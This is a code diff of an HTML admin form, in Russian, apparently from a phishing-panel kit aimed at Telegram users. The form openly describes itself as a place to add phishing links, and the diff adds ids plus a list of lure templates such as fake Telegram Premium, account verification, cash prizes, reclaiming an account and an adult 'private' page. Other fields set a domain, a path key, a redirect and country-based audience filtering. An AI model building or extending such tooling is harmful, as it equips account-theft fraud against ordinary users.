@@ -65,18 +65,28 @@
     <p class="desc">Здесь вы можете добавить фишинговые ссылки</p>
     <form action="" class="form">
         <label for="" class="form__title">Домен</label>
-        <input type="text" placeholder="Введите домен..." class="form__input">
+        <input type="text" placeholder="Введите домен..." class="form__input" id="domain">
 
         <label for="" class="form__title">Шаблон фейка</label>
-        <select name="" id="" class="form__input">
-            <option value="">Выберите фейк</label>
+        <select id="page" class="form__input">
+            <option value="">Выберите фейк</option>
+            <option value="Telegram Premium">Telegram Premium</option>
+            <option value="Верификация аккаунта">Верификация аккаунта</option>
+            <option value="Голос другу">Голос другу</option>
+            <option value="Денежный приз">Денежный приз</option>
+            <option value="Доступ к боту">Доступ к боту</option>
+            <option value="Забрать аккаунт">Забрать аккаунт</option>
+            <option value="Накрутка лайков">Накрутка лайков</option>
+            <option value="Приват 18+">Приват 18+</option>
+            <option value="Простой вход">Простой вход</option>
+            <option value="Участие в голосовании">Участие в голосовании</option>
         </select>
 
         <label for="" class="form__title">Дополнительный ключ</label>
-        <input type="text" placeholder="Введите ключ" class="form__input">
+        <input type="text" placeholder="Введите ключ" class="form__input" id="path">
 
         <label for="" class="form__title">Редирект с главной домена</label>
-        <input type="text" placeholder="Введите URL" class="form__input">
+        <input type="text" placeholder="Введите URL" class="form__input" id="redirect">
 
         <label for="" class="form__title">Выберите страны вашей аудитории (защита от DDOS)</label>
         <select class="js-select2" multiple="multiple" class="form__input">
